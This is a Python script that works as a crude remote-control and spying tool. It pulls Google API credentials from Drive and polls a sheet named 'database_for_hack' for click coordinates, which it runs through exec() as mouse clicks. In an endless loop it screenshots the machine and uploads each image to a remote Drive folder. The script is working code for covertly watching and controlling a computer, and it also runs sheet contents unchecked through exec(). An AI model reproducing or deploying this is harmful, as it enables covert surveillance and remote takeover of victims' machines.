import pygsheets
import pyautogui
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import os
from google_drive_downloader import GoogleDriveDownloader as gdd
def download_file_from_google_drive(id, destination):
    gdd.download_file_from_google_drive(file_id=id,
                                        dest_path=destination,
                                        unzip=False)
def get_confirm_token(response):
    for key, value in response.cookies.items():
        if key.startswith('download_warning'):
            return value

    return None


def save_response_content(response, destination):
    CHUNK_SIZE = 32768

    with open(destination, "wb") as f:
        for chunk in response.iter_content(CHUNK_SIZE):
            if chunk:  # filter out keep-alive new chunks
                f.write(chunk)
try:
    os.remove("/content/settings.yaml")
except:
    yyyyyy=1
download_file_from_google_drive("1POpfRM_IUZpiHJ5tX7fSLZJ8uXDwwzf8","C:/Users/User/Downloads/directory/settings.yaml")
try:
    os.remove("/content/credentials.json")
except:
    yyyyyy=1
download_file_from_google_drive("1uTZGKA3gRF2MreiwIxUA6pfPZPTxjadQ","C:/Users/User/Downloads/directory/credentials.json")
try:
    os.remove("/content/client_secrets.json")
except:
    yyyyyy=1
download_file_from_google_drive("1VjnFZ36XMm3HEBzjuaeE8JJe0fT5yHRv","C:/Users/User/Downloads/directory/client_secrets.json")
try:
    os.remove("/content/sheets.googleapis.com-python.json")
except:
    yyyyyy=1
download_file_from_google_drive("1v5T1s2HmYzkwOJ3J_Lgu1hmP0Rz3FE4l","C:/Users/User/Downloads/directory/sheets.googleapis.com-python.json")
print(1)
def seperate(whole):
    a = []
    for i in range(len(whole)):
        a.append(whole[i])
    return (a)


def find(strin, find, replace):
    strin = seperate(strin)
    for i in range(len(strin)):
        if strin[i - 1] == find:
            strin[i - 1] = replace
    e = strin[0]
    for i in range(len(strin) - 1):
        e = e + strin[i + +1]
    return (e)
gc = pygsheets.authorize()
hac = gc.open("database_for_hack")
poslast = "0,0"
gauth = GoogleAuth()
drive = GoogleDrive(gauth)
image = pyautogui.screenshot()
e = 0
while True:
    postoclick = hac.sheet1.get_value(((1, 1)))
    postoclick = find(postoclick, ",", "")
    postoclick = find(postoclick, "p", ",")
    if not postoclick == poslast:
        exec("pyautogui.click(" + postoclick + ")")
    poslast = postoclick
    fileList = drive.ListFile({'q': "'1v8pKPKqvKkv8UjJyTELbrnNaygHtETiT' in parents and trashed=false"}).GetList()
    nu=0
    for file in fileList:
        nu+=1
    nu2=0
    for file in fileList:
        nu2+=1
        fileID2 = file['id']
        if not nu2 == 1:
            file1 = drive.CreateFile({'id': fileID2})
            file1.Delete()
    image = pyautogui.screenshot()
    try:
        os.remove("image.png")
    except:
        yyyyyy=1
    image.save(r'C:/Users/USER/Downloads/directory/image.png')
    file_metadata = {'title': "image.png", "parents": [{"id": "1v8pKPKqvKkv8UjJyTELbrnNaygHtETiT", "kind": "drive#childList"}]}
    folder = drive.CreateFile(file_metadata)
    folder.SetContentFile("image.png")  # The contents of the file
    folder.Upload()

